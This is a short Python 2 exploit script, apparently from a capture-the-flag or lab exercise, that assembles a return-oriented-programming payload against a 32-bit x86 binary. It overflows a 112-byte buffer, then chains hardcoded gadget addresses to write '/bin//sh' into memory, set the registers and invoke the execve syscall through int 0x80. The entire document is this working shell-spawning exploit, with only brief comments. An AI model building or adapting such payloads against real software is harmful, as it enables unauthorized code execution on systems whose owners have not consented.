#!/usr/bin/env python2

your_buffer =  "A"*112
#0x080b9116 : pop eax ; ret
#0x0806f68b : pop edx ; ret
#0x08054c7b : mov dword ptr [edx], eax ; ret
#0x080496c3 : xor eax, eax ; ret
#0x080b90b6 : push eax ; ret
#0x0806ba39 : add esp, 4 ; ret
#0x080481c9 : pop ebx ; ret
#0x080d66ec : pop ecx ; ret
#0x0805548c : cdq ; pop ebp ; ret
#0x08048a17 : inc eax ; ret
#0x080483ca : pop ebp ; ret
#0x0806d065 : int 0x80
#0x080eb064 heap addr
#0xbfffee98
your_buffer=your_buffer+"\x98\xee\xff\xbf"
#creating /bin/sh and storing at mem
your_buffer=your_buffer+"\x16\x91\x0b\x08"
your_buffer+="/bin"
your_buffer=your_buffer+"\x8b\xf6\x06\x08"
your_buffer+="\x70\xb0\x0e\x08"
your_buffer=your_buffer+"\x7b\x4c\x05\x08"
your_buffer=your_buffer+"\x16\x91\x0b\x08"
your_buffer+="//sh"
your_buffer=your_buffer+"\x8b\xf6\x06\x08"
your_buffer+="\x74\xb0\x0e\x08"
your_buffer=your_buffer+"\x7b\x4c\x05\x08"

#setting registers
#set next 4 bytes null in mem next to \bin\sh
your_buffer=your_buffer+"\xc3\x96\x04\x08"
your_buffer=your_buffer+"\x8b\xf6\x06\x08"
your_buffer+="\x78\xb0\x0e\x08"
your_buffer=your_buffer+"\x7b\x4c\x05\x08"
#setting ebx as location of \bin\sh
your_buffer=your_buffer+"\xc9\x81\x04\x08"
your_buffer+="\x70\xb0\x0e\x08"
#set ecx as address of location of mem
your_buffer=your_buffer+"\xec\x66\x0d\x08"
your_buffer+="\x78\xb0\x0e\x08"
#set edx 
your_buffer=your_buffer+"\x8b\xf6\x06\x08"
your_buffer+="\x78\xb0\x0e\x08"
#set eax as 0xb
your_buffer=your_buffer+"\xc3\x96\x04\x08"
for i in range(11):
	your_buffer+="\x17\x8a\x04\x08"
#syscall
your_buffer+="\x65\xd0\x06\x08"

print(your_buffer)
